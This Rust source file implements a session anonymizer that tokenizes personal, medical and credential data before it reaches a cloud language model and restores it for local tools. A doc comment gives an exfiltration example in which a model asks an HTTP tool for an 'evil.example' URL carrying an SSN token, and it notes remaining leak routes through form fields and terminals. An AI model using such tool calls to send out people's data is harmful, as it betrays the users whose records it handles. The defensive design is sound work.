use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::HashMap;
use std::sync::OnceLock;

/// Categories of sensitive personally identifiable or protected health information.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum EntityType {
    Patient,
    PersonName,
    CreditCard,
    Ssn,
    Email,
    PhoneNumber,
    MedicalRecordNumber,
    Ipv4,
    Ipv6,
    SecretKey,
    PublicKey,
}

impl EntityType {
    pub fn token_prefix(&self) -> &'static str {
        match self {
            EntityType::Patient => "PATIENT",
            EntityType::PersonName => "PERSON",
            EntityType::CreditCard => "CREDIT_CARD",
            EntityType::Ssn => "SSN",
            EntityType::Email => "EMAIL",
            EntityType::PhoneNumber => "PHONE",
            EntityType::MedicalRecordNumber => "MRN",
            EntityType::Ipv4 => "IPV4",
            EntityType::Ipv6 => "IPV6",
            EntityType::SecretKey => "SECRET_KEY",
            EntityType::PublicKey => "PUBLIC_KEY",
        }
    }
}

// Regex accessors using OnceLock (stable since Rust 1.70, compatible with MSRV 1.78).
fn ssn_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\b\d{3}-\d{2}-\d{4}\b").expect("valid SSN regex"))
}

fn email_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
            .expect("valid email regex")
    })
}

fn uuid_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b",
        )
        .expect("valid UUID regex")
    })
}

fn phone_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // Phone *shapes*, not any run of digit groups: "1920 1080 144" is a
    // resolution and a refresh rate. Recognised: a 3-3-4 number with an
    // optional country code ("+1 555-123-4567", "(555) 123-4567"), a
    // trunk-prefixed 11-digit national number ("0803 123 4567"), and anything
    // written with an explicit international "+".
    RE.get_or_init(|| {
        Regex::new(
            r"(?:\+\d{1,3}[-.\s]?)?(?:\(\d{3}\)|\b\d{3})[-.\s]\d{3}[-.\s]\d{4}\b|\b0\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b|\+\d{1,3}(?:[-.\s]?\d{2,4}){2,5}\b",
        )
        .expect("valid phone regex")
    })
}

fn mrn_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\b(?:MRN|mrn|PAT|pat)[-:#\s]*([A-Za-z0-9]{6,12})\b").expect("valid MRN regex")
    })
}

fn ipv4_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
            .expect("valid IPv4 regex")
    })
}

fn cc_candidate_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\b(?:\d[- ]?){13,19}\b").expect("valid CC candidate regex"))
}

fn secret_key_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\b(?:sk_(?:live|test|prod|dev|sandbox)_[A-Za-z0-9_]{16,}|sk_[A-Za-z0-9_]{20,}|sk-(?:proj-|ant-|admin-)?[A-Za-z0-9_-]{24,}|FLWSECK(?:_TEST)?-[A-Za-z0-9_]{16,})\b")
            .expect("valid secret key regex")
    })
}

fn public_key_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\b(?:pk_(?:live|test|prod|dev|sandbox)_[A-Za-z0-9_]{16,}|pk_[A-Za-z0-9_]{20,}|FLWPUBK(?:_TEST)?-[A-Za-z0-9_]{16,})\b")
            .expect("valid public key regex")
    })
}

fn token_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"<[A-Z_]+_\d+>").expect("valid token regex"))
}

/// Most distinct values one session remembers for de-tokenization.
pub const MAX_ENTITIES: usize = 10_000;

/// Tools whose arguments may carry a synthetic token back to its plaintext.
///
/// De-tokenizing is the dangerous half of the tokenizer: whatever tool receives
/// the plaintext can send it anywhere. A model that sees `<SSN_1>` could ask
/// `http_request` for `https://evil.example/?d=<SSN_1>` and the server would
/// fill in the real number on the way out. So plaintext is only ever restored
/// into tools that put text into a local UI control, and a known token in any
/// other tool's arguments is refused before the call runs.
///
/// This narrows the channel; it does not close it. Typing a token into a field
/// on a page the model chose, or into a terminal, still delivers the plaintext
/// there. See `documented_known_bypasses` in `tests/anonymize.rs`.
pub const TOKEN_SINK_TOOLS: &[&str] = &[
    "keyboard_type",
    "set_value",
    "ui_fill_form",
    "browser_fill_form",
    "browser_act",
];

/// Whether `tool` may receive de-tokenized plaintext.
pub fn is_token_sink(tool: &str) -> bool {
    TOKEN_SINK_TOOLS.contains(&tool)
}

/// Validates whether a raw numeric string passes the Luhn checksum algorithm
/// and starts with a known payment card IIN prefix (Visa, Mastercard, Amex, Discover, etc.).
pub fn is_luhn_credit_card(raw: &str) -> bool {
    let digits: Vec<u8> = raw
        .chars()
        .filter(|c| c.is_ascii_digit())
        .map(|c| c as u8 - b'0')
        .collect();

    let len = digits.len();
    if !(13..=19).contains(&len) {
        return false;
    }

    // Check IIN / BIN prefixes
    let d0 = digits[0];
    let d01 = d0 * 10 + digits[1];
    let d03 = if len >= 4 {
        digits[0] as u32 * 1000 + digits[1] as u32 * 100 + digits[2] as u32 * 10 + digits[3] as u32
    } else {
        0
    };

    let is_valid_prefix = match d0 {
        4 => len == 13 || len == 16 || len == 19,       // Visa
        5 => (51..=55).contains(&d01) && len == 16,     // Mastercard
        2 => (2221..=2720).contains(&d03) && len == 16, // Mastercard 2xxx
        3 => {
            // Amex (34, 37, 15 digits) or Diners (300-305, 36, 38, 14 digits) or JCB (35, 16 digits)
            if ((d01 == 34 || d01 == 37) && len == 15) || ((d01 == 36 || d01 == 38) && len == 14) {
                true
            } else {
                d01 == 35 && len == 16 // JCB
            }
        }
        6 => {
            // Discover (6011, 622126-622925, 644-649, 65)
            (d01 == 65 || d03 == 6011 || (644..=649).contains(&(d03 / 10))) && len == 16
        }
        _ => false,
    };

    if !is_valid_prefix {
        return false;
    }

    // Luhn checksum calculation
    let mut sum = 0;
    let mut alternate = false;
    for &d in digits.iter().rev() {
        let mut n = d as u32;
        if alternate {
            n *= 2;
            if n > 9 {
                n -= 9;
            }
        }
        sum += n;
        alternate = !alternate;
    }

    sum % 10 == 0
}

/// Validates whether a candidate string is a plausible US Social Security Number.
pub fn is_valid_ssn(raw: &str) -> bool {
    let parts: Vec<&str> = raw.split('-').collect();
    if parts.len() != 3 {
        return false;
    }
    let (area_str, group_str, serial_str) = (parts[0], parts[1], parts[2]);
    if area_str.len() != 3 || group_str.len() != 2 || serial_str.len() != 4 {
        return false;
    }
    let Ok(area) = area_str.parse::<u32>() else {
        return false;
    };
    let Ok(group) = group_str.parse::<u32>() else {
        return false;
    };
    let Ok(serial) = serial_str.parse::<u32>() else {
        return false;
    };

    // SSA Rules:
    // Area cannot be 000, 666, or 900-999.
    // Group cannot be 00.
    // Serial cannot be 0000.
    if area == 0 || area == 666 || area >= 900 {
        return false;
    }
    if group == 0 {
        return false;
    }
    if serial == 0 {
        return false;
    }

    true
}

/// A detected sensitive entity span within a string.
#[derive(Debug, Clone, PartialEq, Eq)]
struct EntityMatch {
    start: usize,
    end: usize,
    text: String,
    entity_type: EntityType,
}

/// In-memory bidirectional tokenizer for a single session.
///
/// Guarantees that sensitive PII/PHI (names, credit cards, SSNs, emails, phone numbers)
/// are masked with synthetic tokens (`<PATIENT_1>`, `<SSN_1>`) before reaching cloud LLMs,
/// and de-anonymized back to the original client values immediately before local execution.
#[derive(Debug, Clone, Default)]
pub struct SessionAnonymizer {
    entity_to_token: HashMap<String, String>,
    token_to_entity: HashMap<String, String>,
    counters: HashMap<EntityType, usize>,
    registered_entities: Vec<(String, EntityType)>,
    enabled: bool,
}

impl SessionAnonymizer {
    /// Create a new session anonymizer. Enabled by default.
    pub fn new() -> Self {
        SessionAnonymizer {
            entity_to_token: HashMap::new(),
            token_to_entity: HashMap::new(),
            counters: HashMap::new(),
            registered_entities: Vec::new(),
            enabled: true,
        }
    }

    pub fn with_enabled(mut self, enabled: bool) -> Self {
        self.enabled = enabled;
        self
    }

    pub fn is_enabled(&self) -> bool {
        self.enabled
    }

    pub fn set_enabled(&mut self, enabled: bool) {
        self.enabled = enabled;
    }

    /// Explicitly register an entity to be masked (e.g. patient name, doctor name).
    pub fn register(&mut self, entity: &str, entity_type: EntityType) {
        let trimmed = entity.trim();
        if trimmed.is_empty() {
            return;
        }
        if !self.registered_entities.iter().any(|(e, _)| e == trimmed) {
            self.registered_entities
                .push((trimmed.to_string(), entity_type));
        }
        // Pre-allocate token
        self.get_or_create_token(trimmed, entity_type);
    }

    /// Obtain the persistent synthetic token for an entity, allocating a new one if unseen.
    ///
    /// Past [`MAX_ENTITIES`] distinct values the session stops remembering new
    /// ones: they are still masked, as `<TYPE_REDACTED>`, but cannot be typed
    /// back. Masking must not fail open, and the map must not grow without
    /// bound over a long session.
    pub fn get_or_create_token(&mut self, entity: &str, entity_type: EntityType) -> String {
        if let Some(token) = self.entity_to_token.get(entity) {
            return token.clone();
        }
        if self.entity_to_token.len() >= MAX_ENTITIES {
            return format!("<{}_REDACTED>", entity_type.token_prefix());
        }

        let count = self.counters.entry(entity_type).or_insert(0);
        *count += 1;
        let token = format!("<{}_{}>", entity_type.token_prefix(), count);

        self.entity_to_token
            .insert(entity.to_string(), token.clone());
        self.token_to_entity
            .insert(token.clone(), entity.to_string());
        token
    }

    /// Anonymize all detected sensitive entities in a plaintext string.
    pub fn anonymize_text(&mut self, text: &str) -> String {
        if !self.enabled || text.is_empty() {
            return text.to_string();
        }

        let mut matches = Vec::new();

        // 0. UUID spans - collected to prevent any false positives within UUIDs
        let uuid_spans: Vec<(usize, usize)> = uuid_re()
            .find_iter(text)
            .map(|m| (m.start(), m.end()))
            .collect();
        let in_uuid = |start: usize, end: usize| -> bool {
            uuid_spans.iter().any(|(s, e)| start >= *s && end <= *e)
        };

        // 1. Registered entities (highest precedence)
        for (registered, entity_type) in &self.registered_entities {
            let mut start = 0;
            while let Some(pos) = text[start..].find(registered) {
                let actual_start = start + pos;
                let actual_end = actual_start + registered.len();
                matches.push(EntityMatch {
                    start: actual_start,
                    end: actual_end,
                    text: registered.clone(),
                    entity_type: *entity_type,
                });
                start = actual_end;
            }
        }

        // 2. Secret Key regex (Stripe/Paystack sk_live/sk_test, OpenAI/Anthropic sk-, etc.)
        for m in secret_key_re().find_iter(text) {
            if in_uuid(m.start(), m.end()) {
                continue;
            }
            matches.push(EntityMatch {
                start: m.start(),
                end: m.end(),
                text: m.as_str().to_string(),
                entity_type: EntityType::SecretKey,
            });
        }

        // 3. Public / Publishable Key regex (Stripe/Paystack pk_live/pk_test, Flutterwave, Clerk, etc.)
        for m in public_key_re().find_iter(text) {
            if in_uuid(m.start(), m.end()) {
                continue;
            }
            matches.push(EntityMatch {
                start: m.start(),
                end: m.end(),
                text: m.as_str().to_string(),
                entity_type: EntityType::PublicKey,
            });
        }

        // 4. SSN regex
        for m in ssn_re().find_iter(text) {
            if in_uuid(m.start(), m.end()) {
                continue;
            }
            if is_valid_ssn(m.as_str()) {
                matches.push(EntityMatch {
                    start: m.start(),
                    end: m.end(),
                    text: m.as_str().to_string(),
                    entity_type: EntityType::Ssn,
                });
            }
        }

        // 3. Credit Card regex + Luhn checksum
        for m in cc_candidate_re().find_iter(text) {
            if in_uuid(m.start(), m.end()) {
                continue;
            }
            if is_luhn_credit_card(m.as_str()) {
                matches.push(EntityMatch {
                    start: m.start(),
                    end: m.end(),
                    text: m.as_str().to_string(),
                    entity_type: EntityType::CreditCard,
                });
            }
        }

        // 4. Email regex
        for m in email_re().find_iter(text) {
            if in_uuid(m.start(), m.end()) {
                continue;
            }
            matches.push(EntityMatch {
                start: m.start(),
                end: m.end(),
                text: m.as_str().to_string(),
                entity_type: EntityType::Email,
            });
        }

        // 5. MRN regex
        for m in mrn_re().find_iter(text) {
            if in_uuid(m.start(), m.end()) {
                continue;
            }
            matches.push(EntityMatch {
                start: m.start(),
                end: m.end(),
                text: m.as_str().to_string(),
                entity_type: EntityType::MedicalRecordNumber,
            });
        }

        // 6. IPv4 regex (exclude 127.0.0.1 and 0.0.0.0 localhost/wildcards)
        for m in ipv4_re().find_iter(text) {
            if in_uuid(m.start(), m.end()) {
                continue;
            }
            let ip = m.as_str();
            // Four numbers inside a longer dotted run, or after a "v", are a
            // version ("10.0.19045.2364", "v1.2.3.4"), not an address.
            let before = text[..m.start()].chars().next_back();
            let after = &text[m.end()..];
            let in_version = matches!(before, Some('.') | Some('v') | Some('V'))
                || (after.starts_with('.') && after[1..].starts_with(|c: char| c.is_ascii_digit()));
            if ip != "127.0.0.1" && ip != "0.0.0.0" && !in_version {
                matches.push(EntityMatch {
                    start: m.start(),
                    end: m.end(),
                    text: ip.to_string(),
                    entity_type: EntityType::Ipv4,
                });
            }
        }

        // 7. Phone regex (only if not overlapping an already-matched credit card or SSN)
        for m in phone_re().find_iter(text) {
            if in_uuid(m.start(), m.end()) {
                continue;
            }
            // Ensure not preceded or followed by hyphen/dot and a digit (avoiding sub-spans of longer keys/cards)
            let before = &text[..m.start()];
            if before.ends_with('-') || before.ends_with('.') {
                let trimmed = before[..before.len() - 1].trim_end();
                if trimmed.ends_with(|c: char| c.is_ascii_digit()) {
                    continue;
                }
            }
            let after = &text[m.end()..];
            if after.starts_with('-') || after.starts_with('.') {
                let trimmed = after[1..].trim_start();
                if trimmed.starts_with(|c: char| c.is_ascii_digit()) {
                    continue;
                }
            }
            let s = m.as_str();
            let digit_count = s.chars().filter(|c| c.is_ascii_digit()).count();
            if (7..=15).contains(&digit_count) {
                matches.push(EntityMatch {
                    start: m.start(),
                    end: m.end(),
                    text: s.to_string(),
                    entity_type: EntityType::PhoneNumber,
                });
            }
        }

        if matches.is_empty() {
            return text.to_string();
        }

        // Sort matches by start position; resolve overlaps by keeping earliest/longest
        matches.sort_by(|a, b| {
            if a.start != b.start {
                a.start.cmp(&b.start)
            } else {
                (b.end - b.start).cmp(&(a.end - a.start))
            }
        });

        let mut filtered: Vec<EntityMatch> = Vec::new();
        let mut last_end = 0;
        for m in matches {
            if m.start >= last_end {
                last_end = m.end;
                filtered.push(m);
            }
        }

        // Build tokenized string
        let mut out = String::with_capacity(text.len());
        let mut cursor = 0;
        for m in filtered {
            if m.start > cursor {
                out.push_str(&text[cursor..m.start]);
            }
            let token = self.get_or_create_token(&m.text, m.entity_type);
            out.push_str(&token);
            cursor = m.end;
        }
        if cursor < text.len() {
            out.push_str(&text[cursor..]);
        }

        out
    }

    /// Recursively anonymize all strings in a JSON value in place.
    pub fn anonymize_value(&mut self, val: &mut Value) {
        if !self.enabled {
            return;
        }
        match val {
            Value::String(s) => {
                *s = self.anonymize_text(s);
            }
            Value::Array(arr) => {
                for item in arr.iter_mut() {
                    self.anonymize_value(item);
                }
            }
            Value::Object(map) => {
                for (_, v) in map.iter_mut() {
                    self.anonymize_value(v);
                }
            }
            _ => {}
        }
    }

    /// De-anonymize synthetic tokens in a plaintext string back to the original entities.
    pub fn de_anonymize_text(&self, text: &str) -> String {
        if !self.enabled || self.token_to_entity.is_empty() || text.is_empty() {
            return text.to_string();
        }

        let mut out = String::with_capacity(text.len());
        let mut cursor = 0;
        for m in token_re().find_iter(text) {
            if m.start() > cursor {
                out.push_str(&text[cursor..m.start()]);
            }
            if let Some(entity) = self.token_to_entity.get(m.as_str()) {
                out.push_str(entity);
            } else {
                out.push_str(m.as_str());
            }
            cursor = m.end();
        }
        if cursor < text.len() {
            out.push_str(&text[cursor..]);
        }
        out
    }

    /// Recursively de-anonymize all strings in a JSON value in place.
    pub fn de_anonymize_value(&self, val: &mut Value) {
        if !self.enabled || self.token_to_entity.is_empty() {
            return;
        }
        match val {
            Value::String(s) => {
                *s = self.de_anonymize_text(s);
            }
            Value::Array(arr) => {
                for item in arr.iter_mut() {
                    self.de_anonymize_value(item);
                }
            }
            Value::Object(map) => {
                for (_, v) in map.iter_mut() {
                    self.de_anonymize_value(v);
                }
            }
            _ => {}
        }
    }

    /// The tokens issued by this session that appear anywhere in `val`, sorted
    /// and deduplicated. Text that merely looks like a token but was never
    /// issued is not reported: it resolves to nothing, so it carries nothing.
    pub fn known_tokens_in(&self, val: &Value) -> Vec<String> {
        let mut found = Vec::new();
        if self.enabled && !self.token_to_entity.is_empty() {
            self.collect_known_tokens(val, &mut found);
        }
        found.sort();
        found.dedup();
        found
    }

    fn collect_known_tokens(&self, val: &Value, found: &mut Vec<String>) {
        match val {
            Value::String(s) => {
                for m in token_re().find_iter(s) {
                    if self.token_to_entity.contains_key(m.as_str()) {
                        found.push(m.as_str().to_string());
                    }
                }
            }
            Value::Array(arr) => arr.iter().for_each(|v| self.collect_known_tokens(v, found)),
            Value::Object(map) => map
                .values()
                .for_each(|v| self.collect_known_tokens(v, found)),
            _ => {}
        }
    }

    /// Return count of masked entity pairs.
    pub fn entity_count(&self) -> usize {
        self.entity_to_token.len()
    }

    /// Lookup raw entity by synthetic token.
    pub fn get_entity(&self, token: &str) -> Option<&str> {
        self.token_to_entity.get(token).map(|s| s.as_str())
    }

    /// Lookup synthetic token by raw entity.
    pub fn get_token(&self, entity: &str) -> Option<&str> {
        self.entity_to_token.get(entity).map(|s| s.as_str())
    }
}
